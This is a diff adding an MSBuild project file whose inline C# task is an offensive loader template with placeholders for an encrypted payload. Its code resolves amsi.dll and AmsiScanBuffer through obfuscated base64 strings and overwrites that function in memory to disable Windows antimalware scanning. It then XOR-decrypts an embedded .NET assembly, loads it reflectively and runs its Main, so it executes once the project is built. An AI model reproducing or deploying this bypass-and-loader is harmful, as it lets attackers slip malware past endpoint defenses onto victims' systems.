@@ -1,0 +1,153 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="c">
+   <c/>
+  </Target>
+  <UsingTask
+    TaskName="c"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+  <Task>
+    <Reference Include="System.Management.Automation"/>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+		
+using System;
+using System.Reflection;
+using System.Text;
+using System.Runtime.InteropServices;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+namespace csharp
+{
+    class Program
+    {
+        [DllImport("ke" + "rne" + "l32")]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("ke" + "rne" + "l32")]
+        private static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("ke" + "rne" + "l32")]
+        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        private static void CopyData(byte[] dataStuff, IntPtr somePlaceInMem, int holderFoo = 0)
+        {
+            Marshal.Copy(dataStuff, holderFoo, somePlaceInMem, dataStuff.Length);
+        }
+        private static void Thing()
+        {
+            try
+            {
+                var fooBar = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS" + "5kbGw=")));
+                IntPtr addr = GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5" + "CdWZmZXI=")));
+                uint magicValue = 0x40;
+                uint someNumber = 0;
+
+                if (System.Environment.Is64BitOperatingSystem)
+                {
+                    var bigBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+
+                    VirtualProtect(addr, (UIntPtr)bigBoyBytes.Length, magicValue, out someNumber);
+                    CopyData(bigBoyBytes, addr);
+                }
+                else
+                {
+                    var smallBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+
+                    VirtualProtect(addr, (UIntPtr)smallBoyBytes.Length, magicValue, out someNumber);
+                    CopyData(smallBoyBytes, addr);
+
+                }
+                Console.WriteLine("[+] Patched Ayy Emm Ess Eye!");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Couldn't patch Ayy Emm Ess Eye :(");
+                Console.WriteLine("[!] {0}", ex.Message);
+            }
+        }
+        private static byte[] Zor(byte[] input, byte[] key)
+        {
+            byte[] mixed = new byte[input.Length];
+            for (int i = 0; i < input.Length; i++)
+            {
+                mixed[i] = (byte)(input[i] ^ key[i % key.Length]);
+            }
+            return mixed;
+        }
+        public static void Main(string[] args)
+        {
+            Assembly assembly = null;
+            bool foundMain = false;
+            bool execMain = false;
+
+            Thing();
+
+            try
+            {
+		string data = "~~ASSEMBLY~~";
+		string key = "~~KEY~~";
+                assembly = Assembly.Load(Zor(Convert.FromBase64String(data), Encoding.UTF8.GetBytes(key)));
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[!] Could not load assembly. Returned the following error:\n\n");
+				Console.WriteLine(e);
+                Environment.Exit(1);
+            }
+
+            Type[] types = assembly.GetExportedTypes();
+
+            foreach (Type type in types)
+            {
+                MethodInfo[] methods = type.GetMethods();
+                foreach (MethodInfo method in methods)
+                {
+                    if (method.Name == "Main")
+                    {
+                        foundMain = true;
+                        if (!type.Attributes.HasFlag(TypeAttributes.Abstract))
+                        {
+                            execMain = true;
+                            object instance = Activator.CreateInstance(type);
+                            if (args.Length == 0)
+                            {
+                                Console.WriteLine("[*] Running assembly with no arguments");
+                            }
+                            else
+                            {
+                                Console.WriteLine("[*] Running assembly with arguments: " + string.Join(" ", args));
+                            }
+                            var output = method.Invoke(instance, new object[] { args });
+                            Console.WriteLine(output);
+                        }
+                    }
+                }
+            }
+            if (!foundMain)
+            {
+                Console.WriteLine("[!] No public \"Main()\" function found in assembly. Did you make sure to set the class as public?");
+            }
+            else if (!execMain)
+            {
+                Console.WriteLine("[!] Found public \"Main()\" function but could not execute it. Make your assembly's CPU arch matches this program.");
+            }
+        }
+    }
+    public class c : Task, ITask
+    {
+        public override bool Execute()
+        {
+            Program.Main(new string[] {~~ARGS~~});
+            return true;
+        }
+   }
+}
+
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+
